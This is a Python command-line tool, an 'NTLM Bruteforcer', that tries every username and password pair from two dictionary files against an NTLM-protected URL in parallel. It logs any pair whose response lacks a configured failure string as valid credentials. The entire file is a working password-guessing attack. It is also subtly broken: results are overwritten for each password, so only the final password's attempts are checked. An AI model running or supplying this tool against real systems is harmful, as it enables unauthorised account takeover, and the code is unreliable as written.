#!/usr/bin/env python3
# -*- coding: utf-8
#**** AUTHOR: - DI0NJ@CK - (compatible with Python 3.7.x)
__author__      = 'Di0nj@ck'
__version__     = 'v1'
__last_update__ = 'January 2020'

import os,sys,argparse,datetime,psutil,subprocess,requests
from multiprocessing import Pool
from requests_ntlm import HttpNtlmAuth

#GLOBAL VARIABLES
num_threads = psutil.cpu_count()
output_file = "results.txt"
valid_credentials = []
wrong_credentials_regex = "your_string_here"

#FUNCTIONS
def reader(path):
    try:
        lines_list = []

        with open(path, 'r+', encoding="utf-8") as f:
            lines = filter(None, (line.rstrip() for line in f))
            for a_line in lines:
                if not a_line.startswith('#'): #FILTER OUT FILE COMMENTS
                    lines_list.append(a_line.strip('\n')) #DELETE NEWLINE CHARACTERS 
        return lines_list
    except:
        return False

def writer(output_file,data):
	try:
		with open(output_file, 'w+') as f:
			for item in data:
				f.write("%s\n" % item)
	except:
		return False

def fuzz_login(user,a_pass,url,domain):
	info = {'user':user,'pass':a_pass,'domain':domain,'output':''}
	username = '%s\\%s' % (domain,user)
	print(" 	> %s:%s\n" % (username,a_pass))
	try:
		result = requests.get(url,auth=HttpNtlmAuth(username,a_pass))
		info['output'] = result.text
		return info
	except Exception as e:
		print("Error: %s\n" % str(e))
		return info
	

# *** MAIN CODE ***
if __name__ == '__main__': #MAIN CODE STARTS HERE

    #ARG PARSER
	description =  "NTLM Bruteforcer - {__author__}"
	parser = argparse.ArgumentParser(description=description)
	parser.add_argument('target_url', help='target url')
	parser.add_argument('-u', help='path of usernames dictionary', dest='users_file')
	parser.add_argument('-p', help='path of passwords dictionary', dest='pass_file')
	parser.add_argument('-d', help='specify a domain for users', dest='domain')
	parser.add_argument('-v', help='displays the current version', action='version', version=__version__)
	args = parser.parse_args()

	users = reader(args.users_file)
	passwords = reader(args.pass_file)
	url = args.target_url
	domain = args.domain
	num_credentials = len(users) * len(passwords)

	print('[+] Starting NTLM Bruteforcer [{:%Y-%m-%d %H:%M:%S}]'.format(datetime.datetime.now()))

	#MULTI-THREADING
	if num_threads != 0:
		pool = Pool(processes=num_threads)

	print(' [*] Fuzzing %i user:password combinations...\n' % num_credentials)
	print('[+] %i threads initiated\n' % num_threads)

	#FUZZ IT
	for a_pass in passwords:
			results = [pool.apply_async(fuzz_login, args=(a_user,a_pass,url,domain)) for a_user in users]

	#PARSE RESULTS
	for item in results:
		result = item.get()
		if wrong_credentials_regex in result['output']:
			continue
		else:
			print("[!] Valid credentials found!:\n%s:%s\n" % (result['user'],result['pass']))
			valid_credentials.append("%s:%s" % (result['user'],result['pass']))

	#SAVE RESULTS
	if len(valid_credentials) > 0:
		print("[+] RESULTS:\n\t%s\n" % ('\n'.join([str(credential) for credential in valid_credentials])))
		writer(output_file,valid_credentials)
	else:
		print("[+] No valid credentials found!\n")